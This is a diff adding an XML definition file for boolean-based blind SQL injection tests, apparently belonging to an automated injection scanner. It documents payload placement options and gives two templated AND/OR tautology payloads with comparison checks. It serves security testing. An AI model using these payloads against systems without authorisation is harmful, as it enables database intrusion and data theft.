@@ -1,0 +1,66 @@
+<!--
+Tag: <test>
+    SQL injection test definition.
+
+    Sub-tag: <title>
+        Title of the test.
+
+    Sub-tag: <stype>
+        SQL injection family type.
+
+        Valid values:
+            1: Boolean-based blind SQL injection
+            2: Error-based queries SQL injection
+            3: Inline queries SQL injection
+            4: Stacked queries SQL injection
+            5: Time-based blind SQL injection
+            6: UNION query SQL injection
+
+    Sub-tag: <clause>
+        In which clause the payload can work.
+
+        Valid values:
+            0: Always
+            1: WHERE / HAVING
+            2: GROUP BY
+            3: ORDER BY
+            4: LIMIT
+            5: OFFSET
+            6: TOP
+            7: Table name
+            8: Column name
+            9: Pre-WHERE (non-query)
+
+    Sub-tag: <where>
+        Where to add our '<prefix> <payload><comment> <suffix>' string.
+        Only 1 value(1 or 2 or 3)
+​
+    Valid values:
+        1: Append the string to the parameter original value
+        2: Replace the parameter original value with a negative random
+            integer value and append our string
+        3: Replace the parameter original value with our string
+
+-->
+
+<root>
+    <test>
+        <title>AND boolean-based blind - WHERE or HAVING clause</title>
+        <stype>1</stype>
+        <clause>1,8,9</clause>
+        <where>1</where>
+        <desc>param=</desc>
+        <payload>[AND] [_RANDNUM0][=][_RANDNUM0]</payload>
+        <comparison>[AND] [_RANDNUM0][=][_RANDNUM1]</comparison>
+    </test>
+
+    <test>
+        <title>OR boolean-based blind - WHERE or HAVING clause</title>
+        <stype>1</stype>
+        <clause>1,9</clause>
+        <where>2</where>
+        <desc></desc>
+        <payload>[OR] [_RANDNUM0][=][_RANDNUM0]</payload>
+        <comparison>[OR] [_RANDNUM0][=][_RANDNUM1]</comparison>
+    </test>
+</root>
